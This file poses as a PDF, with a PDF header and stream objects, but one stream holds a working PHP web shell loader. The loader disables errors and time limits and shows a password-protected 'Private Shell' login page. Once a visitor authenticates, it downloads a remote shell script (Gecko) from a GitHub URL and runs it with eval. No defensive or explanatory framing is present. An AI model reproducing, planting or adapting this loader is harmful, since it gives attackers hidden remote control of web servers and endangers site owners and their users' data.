%PDF-1.4
%Ã¤Ã¼Ã¶Ã
2 0 obj
<</Length 3 0 R/Filter/FlateDecode>>
stream
x»
Ã0Ew}æÓ+'0¦¡[ÀÐ¡tëc+4K¿rî½:è¿ôapGèLSãúàËßÿg»õEs¥Q»Ì).Ô;oOÂ¹>¯bA
"z¹`°ØÊE²à9·ajØ{Ù´`o¡/ndv«g:VZhá¯å 
endstream
endobj

3 0 obj
130
endobj

5 0 obj
<</Length 6 0 R/Filter/FlateDecode/Length1 24420>>
stream
<?php 
set_time_limit(0);
error_reporting(0);
$auth_pass ="5e257908c9b895b53494ecb21eaecc00";
if(get_magic_quotes_gpc()) {   
function VEstripslashes($array) {     
return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);   }   
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 
function Login() {
  die("<!DOCTYPE html>
  <html>
      <head>
          <title>YAHAHAHA MAMPUSSS - 𝓟𝓻𝓲𝓿𝓪𝓽𝓮 𝓢𝓱𝓮𝓵𝓵</title>
          <meta name='description' content='𝕷𝖎𝖋𝖊 𝖎𝖘𝖓𝖙 𝖆𝖘 𝖘𝖊𝖗𝖎𝖔𝖚𝖘 𝖆𝖘 𝖙𝖍𝖊 𝖒𝖎𝖓𝖉 𝖒𝖆𝖐𝖊𝖘 𝖎𝖙 𝖙𝖔 𝖇𝖊'>
          <link rel='preconnect' href='https://fonts.googleapis.com'>
          <link rel='preconnect' href='https://fonts.gstatic.com' crossorigin>
          <link href='https://fonts.googleapis.com/css2?family=Caveat:wght@700&display=swap' rel='stylesheet'>
          <link rel='icon' href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAA7EAAAOxAGVKw4bAAABzElEQVRYhb2XL0gEURDGfx6HiIhcEBGTwSQGETGICIKIGI5D0WC8YhODSUSDGMzmS6bLYrIIIgaTGEQMYhCDQfAvetx9hl11PffO3Xl3NzDs4/Hm+z5mdnfmgYPJ84QLhlMwMAiMuQAkHQXMAing0BEnvvnpvxDcupbBKqBfIN9HrTguymcC6zkHHJsJzgIZuGloGQS9AfIvH7ZgWVXPhOw1rgyC05AMXKlB5D2CYogACQbi4llKkKkSNxsXLClIA+NlgsqfwfVkFbysoMNflwL7pQrPEwQJwZqgUCGt9fCiYFvQ/C1RMCK4bgD5nWAiNH+ClCBfR/J9QWeVEn43mazgpYbE74JlxXnpBX2C8xqQX8mbG+KboFWQcyDPC9pN5GVClgzk64qAHbUmjwbdz02GoFAT7BkycFQr8jbBm0FAUdD1H36UEkwDLQbtCby+4SygUp//ADaAReC1wpnYzemX+Z/hU0h6LwVDgXN9+j2ifXlBP83JJCATApoTtIWcbRHs6O+skHURsBsAehDMR4hJC+4DcftW8mafVIJjQU+M2G7BgR/7ZvobCqb8Gm7KcIWTN2esyGtECxYBq3K8ePo4Q4ItS6DrxTUS1icFciMkyHL2GAAAAABJRU5ErkJggg==' sizes='32x32' />
      </head>
  <style>
      html{
          background-color: black;
      }
      .mind,font{
          text-align: center;
          color: #00ceff;
      }
      input{
          background-color: transparent;
          border-color: black;
          border: 2px solid #00ceff;
          border-radius: 50px 20px;
          text-align: center;
          color: #00ceff;
      }
  </style>
  <body><br><br>
      <h1 class='mind'>Memek.iD</h1>
      <center><br>
          <form method='post'><input style='text-align:center;' type='password' name='pass'></form>
          <br><br><br><font>&copy; 2090 Memek.iD</font>
      </center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
$link = 'https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php';
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, $link);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$output = curl_exec($ch); 
curl_close($ch);      
eval ('?>'.$output);
?>
